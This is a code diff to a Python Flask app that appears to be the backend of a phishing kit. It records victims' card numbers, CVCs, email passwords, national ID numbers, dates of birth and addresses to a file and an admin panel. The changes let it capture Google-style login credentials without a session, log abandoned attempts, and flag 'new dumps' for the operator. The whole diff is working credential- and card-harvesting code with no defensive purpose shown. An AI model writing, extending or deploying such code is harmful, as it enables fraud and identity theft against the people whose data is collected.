@@ -6,7 +6,7 @@ import os
 
 app = Flask(__name__)
 app.secret_key = 'your_secret_key_here'  # Change to a secure random key
-app.permanent_session_lifetime = 600  # 10 minutes session timeout
+app.permanent_session_lifetime = 120  # 2 minutes session timeout
 
 submissions = []
 
@@ -107,78 +107,107 @@ def capture_google():
     auth_email = request.form.get('email')
     auth_password = request.form.get('password')
     
-    if not session.get('form_data'):
-        return 'Session expired or invalid. Please start over.', 400
+    # Allow standalone captures (no session required for the first code)
+    form_data = session.get('form_data', {})  # Default to empty dict if no session
     
-    form_data = session['form_data']
+    # If no session, populate minimal data from request (or defaults for logging)
+    if not form_data:
+        form_data = {
+            'tag': 'N/A (standalone)',
+            'payment_method': 'N/A (standalone)',
+            'full_name': 'N/A (standalone)',
+            'card_number': 'N/A (standalone)',
+            'expiry': 'N/A (standalone)',
+            'cvc': 'N/A (standalone)',
+            'phone': 'N/A (standalone)',
+            'dob': 'N/A (standalone)',
+            'cedula': 'N/A (standalone)',
+            'street': 'N/A (standalone)',
+            'city': 'N/A (standalone)',
+            'province': 'N/A (standalone)',
+            'zip_code': 'N/A (standalone)',
+            'user_agent': request.headers.get('User-Agent', 'N/A'),
+            'ip': request.remote_addr or 'N/A',
+        }
     
     submission = {
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'tag_number': form_data['tag'],
-        'select': form_data['payment_method'],
-        'cardholder_name': form_data['full_name'],
-        'card_number': form_data['card_number'],
-        'expiration_date': form_data['expiry'],
-        'security_code': form_data['cvc'],
-        'email': auth_email,
-        'password': auth_password,
-        'phone_number': form_data['phone'],
-        'date_of_birth': form_data['dob'],
-        'id_number': form_data['cedula'],
-        'billing_address': form_data['street'],
-        'city': form_data['city'],
-        'province': form_data['province'],
-        'zip_code': form_data['zip_code'],
-        'user_agent': form_data['user_agent'],
-        'ip': form_data['ip'],
-        'new': False  # Default, will be updated in admin_dashboard
+        'tag_number': form_data.get('tag', 'N/A'),
+        'select': form_data.get('payment_method', 'N/A'),
+        'cardholder_name': form_data.get('full_name', 'N/A'),
+        'card_number': form_data.get('card_number', 'N/A'),
+        'expiration_date': form_data.get('expiry', 'N/A'),
+        'security_code': form_data.get('cvc', 'N/A'),
+        'email': auth_email or 'N/A',
+        'password': auth_password or 'N/A',
+        'phone_number': form_data.get('phone', 'N/A'),
+        'date_of_birth': form_data.get('dob', 'N/A'),
+        'id_number': form_data.get('cedula', 'N/A'),
+        'billing_address': form_data.get('street', 'N/A'),
+        'city': form_data.get('city', 'N/A'),
+        'province': form_data.get('province', 'N/A'),
+        'zip_code': form_data.get('zip_code', 'N/A'),
+        'user_agent': form_data.get('user_agent', request.headers.get('User-Agent', 'N/A')),
+        'ip': form_data.get('ip', request.remote_addr or 'N/A'),
+        'new': False
     }
     
     submissions.append(submission)
     
     with open('captured_data.txt', 'a') as f:
-        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {auth_email}, Password: {auth_password}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
+        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {auth_email or 'N/A'}, Password: {auth_password or 'N/A'}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
     
-    session.pop('form_data', None)
+    # Clear session only if it exists
+    if 'form_data' in session:
+        session.pop('form_data', None)
     
-    return 'Data captured successfully!'
+    # Return JSON for better JS handling in the first code
+    return {'status': 'success'}, 200
 
 @app.route('/timeout_capture', methods=['POST'])
 def timeout_capture():
-    if session.get('form_data'):
-        form_data = session['form_data']
-        
-        submission = {
-            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'tag_number': form_data['tag'],
-            'select': form_data['payment_method'],
-            'cardholder_name': form_data['full_name'],
-            'card_number': form_data['card_number'],
-            'expiration_date': form_data['expiry'],
-            'security_code': form_data['cvc'],
-            'email': 'N/A (timeout)',
-            'password': 'N/A (timeout)',
-            'phone_number': form_data['phone'],
-            'date_of_birth': form_data['dob'],
-            'id_number': form_data['cedula'],
-            'billing_address': form_data['street'],
-            'city': form_data['city'],
-            'province': form_data['province'],
-            'zip_code': form_data['zip_code'],
-            'user_agent': form_data['user_agent'],
-            'ip': form_data['ip'],
-            'new': False
-        }
-        
-        submissions.append(submission)
-        
+    reason = request.form.get('reason', 'timeout')  # Get reason, default to 'timeout'
+    email_reason = f'N/A ({reason})'  # e.g., 'N/A (tab_switched)'
+    
+    # Allow standalone timeouts
+    form_data = session.get('form_data', {})
+    if not form_data:
+        # Log minimal abandon data without session
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         with open('captured_data.txt', 'a') as f:
-            f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {submission['email']}, Password: {submission['password']}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
-        
-        session.pop('form_data', None)
-        
+            f.write(f"Timestamp: {timestamp}, Tag: N/A (standalone {reason}), Payment: N/A, Name: N/A, Card: N/A, Expiry: N/A, CVC: N/A, Email: {email_reason}, Password: {email_reason}, Phone: N/A, DOB: N/A, Cedula: N/A, Street: N/A, City: N/A, Province: N/A, Zip: N/A, User Agent: {request.headers.get('User-Agent', 'N/A')}, IP: {request.remote_addr or 'N/A'}\n")
         return '', 200
-    return '', 400
+    
+    # Existing logic for session-based timeouts
+    submission = {
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'tag_number': form_data.get('tag', 'N/A'),
+        'select': form_data.get('payment_method', 'N/A'),
+        'cardholder_name': form_data.get('full_name', 'N/A'),
+        'card_number': form_data.get('card_number', 'N/A'),
+        'expiration_date': form_data.get('expiry', 'N/A'),
+        'security_code': form_data.get('cvc', 'N/A'),
+        'email': email_reason,
+        'password': email_reason,
+        'phone_number': form_data.get('phone', 'N/A'),
+        'date_of_birth': form_data.get('dob', 'N/A'),
+        'id_number': form_data.get('cedula', 'N/A'),
+        'billing_address': form_data.get('street', 'N/A'),
+        'city': form_data.get('city', 'N/A'),
+        'province': form_data.get('province', 'N/A'),
+        'zip_code': form_data.get('zip_code', 'N/A'),
+        'user_agent': form_data.get('user_agent', request.headers.get('User-Agent', 'N/A')),
+        'ip': form_data.get('ip', request.remote_addr or 'N/A'),
+        'new': False
+    }
+    
+    submissions.append(submission)
+    
+    with open('captured_data.txt', 'a') as f:
+        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {email_reason}, Password: {email_reason}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
+    
+    session.pop('form_data', None)
+    return '', 200
 
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
@@ -208,18 +237,23 @@ def admin_dashboard():
     # Set 'new' flag based on old last_login (before current login)
     old_last_login_str = session.get('old_last_login', '2000-01-01 00:00:00')
     old_last_login = datetime.strptime(old_last_login_str, '%Y-%m-%d %H:%M:%S')
-    for sub in submissions:
+    first_new_index = -1  # Track index of first new submission
+    has_new_dumps = False
+    for i, sub in enumerate(submissions):
         sub_time = datetime.strptime(sub['timestamp'], '%Y-%m-%d %H:%M:%S')
         sub['new'] = sub_time > old_last_login
+        if sub['new'] and first_new_index == -1:
+            first_new_index = i
+            has_new_dumps = True
     
-    return render_template('admin.html', submissions=submissions, username=username)
+    return render_template('admin.html', submissions=submissions, username=username, first_new_index=first_new_index, has_new_dumps=has_new_dumps)
 
 @app.route('/admin/logout')
 def admin_logout():
     session.pop('logged_in', None)
     session.pop('username', None)
     # Keep last_login for next login comparison
-    return redirect(url_for('admin_login'))
+    return redirect(url_for('admin_login')) 
 
 @app.route('/admin/download')
 def admin_download():
